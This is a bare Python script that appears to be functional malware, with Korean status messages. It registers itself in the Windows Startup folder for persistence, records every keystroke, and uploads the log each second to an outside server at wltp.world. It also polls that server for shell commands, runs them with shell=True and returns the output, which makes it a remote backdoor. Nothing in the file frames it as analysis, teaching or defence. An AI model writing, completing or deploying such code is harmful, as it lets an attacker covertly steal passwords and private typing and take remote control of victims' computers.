import subprocess
import threading
import urllib.request
import urllib.parse
import time
import os
import sys
import shutil
from pynput.keyboard import Listener

url_get_command = 'http://www.wltp.world:3256/get_command'
url_send_result = 'http://www.wltp.world:3256/send_result'
url_send_logs = 'http://www.wltp.world:3256/get_logs'

log, lock = '', threading.Lock()

def startup():
    try:
        src = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        dst = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', os.path.basename(src))
        if src != dst and not os.path.exists(dst):
            shutil.copy(src, dst)
    except Exception as e:
        print(f"[시작 등록 실패] {e}")

def on_press(k):
    global log
    with lock:
        log += str(k).strip("'") + ','

def send_logs():
    global log
    while True:
        time.sleep(1)
        with lock:
            if log:
                try:
                    data = urllib.parse.urlencode({'logs': log}).encode()
                    urllib.request.urlopen(urllib.request.Request(url_send_logs, data=data), timeout=5)
                    log = ''
                except Exception as e:
                    print(f"[로그 전송 실패] {e}")

def send_result_to_server(result):
    try:
        data = urllib.parse.urlencode({'result': result}).encode()
        urllib.request.urlopen(urllib.request.Request(url_send_result, data=data), timeout=5)
    except Exception as e:
        print(f"[결과 전송 실패] {e}")

def get_command_from_server():
    try:
        with urllib.request.urlopen(url_get_command, timeout=5) as response:
            cmd = response.read().decode().strip()
            return cmd
    except Exception as e:
        print(f"[명령 가져오기 실패] {e}")
        return None

def shell_session_loop():
    while True:
        cmd = get_command_from_server()
        if cmd:
            print(f"[명령 수신] {cmd}")
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
                output = result.stdout + result.stderr
                send_result_to_server(output.strip())
            except subprocess.TimeoutExpired:
                send_result_to_server("[명령 실행 시간 초과]")
            except Exception as e:
                send_result_to_server(f"[명령 실행 실패] {e}")
        time.sleep(2)

if __name__ == "__main__":
    startup()
    threading.Thread(target=send_logs, daemon=True).start()
    threading.Thread(target=shell_session_loop, daemon=True).start()
    with Listener(on_press=on_press) as listener:
        listener.join()
